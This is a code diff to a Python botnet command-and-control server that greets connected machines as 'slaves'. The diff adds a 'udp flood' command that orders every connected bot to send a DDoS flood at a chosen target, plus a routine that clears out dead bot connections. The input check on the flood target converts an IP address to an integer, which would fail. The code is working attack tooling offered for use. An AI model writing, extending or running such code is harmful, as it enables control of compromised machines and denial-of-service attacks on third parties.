@@ -9,6 +9,7 @@ from _thread import *
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 soc.settimeout(0.1)
+hac_dos = 0
 iis = []
 addrs = []
 addrsp = []
@@ -22,10 +23,15 @@ m = 0
 
 MSG_WELCOME = ["Hello welcome to the bot network! Now you are my slave...", "You are now my slave.. work for me"]
 
-def sendmsg(msg):
+def clisend(spec, msg):
+    try:
+        spec.send(bytes(f"{msg}", "utf-8"))
+        return True
+    except OSError:
+        return False
+def sendmsg(msg, CMD=False):
     for addr in iis:
         addr.send(bytes(f"{msg}", "utf-8"))
-    print("Message has been send to all bots... ")
 print("[[yellow]CC[/yellow]] Starting botnet server...")
 print("[[yellow]CC[/yellow]] Installing theme module...")
 install()
@@ -37,6 +43,7 @@ except socket.error as e:
     print(f"[[red]SOC[/red]] {str(e)}")
 def command(conn=None, addr=None):
     global m
+    global hac_dos
     while True:
         h_C = input("cp0x$sh> ")
         try:
@@ -47,16 +54,30 @@ def command(conn=None, addr=None):
             command()
         h_C = h_C.split()
         if h_C[0] == "help":
-            print('''Commands: 
+            print('''Help:
+Syntax: help (options) (options) (value)
+Contact for any futher through email on cyber.2f08@gmail.com
+
+Commands: 
 -> [purple]help[/purple] (Show this help message)
 -> [yellow]ip[/yellow] (Return your ipv4 ip)
+-> [yellow]udp[/yellow] (Flood ddos request from all bots to one ip, from all ports)
 -> [purple]lbot[/purple] (Tell the server for bots information)
 -> [yellow]stat[/yellow] (Status of bot leaving/joining)
 -> [cyan]send[/cyan] (Send message to bots)
--> [cyan]clin[/cyan] (Debug client return)
+-> [cyan]clin[/cyan] (Debug client return and dead bots cleaner)
 -> [yellow]cbot[/yellow] (Tell the server for the count of connected bots)
 -> [green]accep[/green] (Continue to search bot in waiting room)
 -> [red]exit[/red] (Exit server)''')
+        elif h_C[0] == "udp":
+            if len(h_C) > 1:
+                if h_C[1] == "flood" and isinstance(int(h_C[2]), int):
+                    sendmsg(f"FLOOD {h_C[2]}", CMD=True)
+                    hac_dos += 1
+                else:
+                    print("Syntax: udp flood (ip)")
+            else:
+                print("Syntax: udp flood (ip)")
         elif h_C[0] == "ip":
             print(f"Your ip: {socket.gethostbyname(socket.gethostname())}")
         elif h_C[0] == "stat":
@@ -70,22 +91,33 @@ def command(conn=None, addr=None):
                 print("Syntax: stat (option), Options: all, lev, jon")
         elif h_C[0] == "clin":
             if len(h_C) > 1:
-                if h_C[1] == "pop":
-                    if len(h_C) > 2:
-                        iis.pop(int(h_C[2]))
-                        addrs.pop(int(h_C[2]))
-                        addrsp.pop(int(h_C[2]))
-                        botIds.pop(int(h_C[2]))
+                if h_C[1] == "clean":
+                    try:
+                        REM = 0
+                        for i in range(len(iis)):
+                            response = clisend(iis[i], "Cleaning dead bots..")
+                            if response == False:
+                                REM += 1
+                                sys.stdout.write(f"\rDead bot socket removed.. : {REM}")
+                                iis.pop(i)
+                                addrs.pop(i)
+                                addrsp.pop(i)
+                                botIds.pop(i)
+                                continue
+                            continue
+                    except IndexError:
+                        print("There is no bots available...")
+                    if REM == 0:
+                        print("There is no dead bots available...")
                     else:
-                        print("Syntax: clin (option) (index range), Options: pop")
+                        print(f"\nBots cleaned: {REM}")
                 else:
-                    print("Syntax: clin (option) (index range), Options: pop")
+                    print("Syntax: clin (option) , Options: clean")
             else:
                 print(iis)
-                print("If you see something 'closed' try to remove it by using command 'clin pop (the index range)'")
         elif h_C[0] == "send":
             if len(addrs) < 1:
-                print("There is not bot available...")
+                print("There is not bot available :( ")
             else:
                 if len(h_C) > 1:
                     txt = []
@@ -95,12 +127,12 @@ def command(conn=None, addr=None):
                         i += 1
                         txt.append(h_C[i])
                     text = ' '.join(map(str, txt))
-                    print("Make sure you remove bots header that disconnect by using 'clin pop (index range of deat bot)'")
+                    print("Make sure you clean the bots first...")
                     doit = input("Send or Leave? ")
                     if doit == "Leave" or doit == "Leave".lower():
-                        print("Ok leaving..")
+                        print("OK")
                     elif doit == "Send" or doit == "Send".lower():
-                        print("Ok sending..")
+                        print("OK")
                         sendmsg(str(text))
                     else:
                         print("Invalid input.. Leaving.. ")
@@ -174,7 +206,7 @@ def mul_client(conn):
         try:
             data = conn.recv(2048)
             print(data)
-            reply = 'John: ' + data.decode('utf-8')
+            reply = data.decode('utf-8')
             if not data:
                 break
             conn.sendall(str.encode(reply))
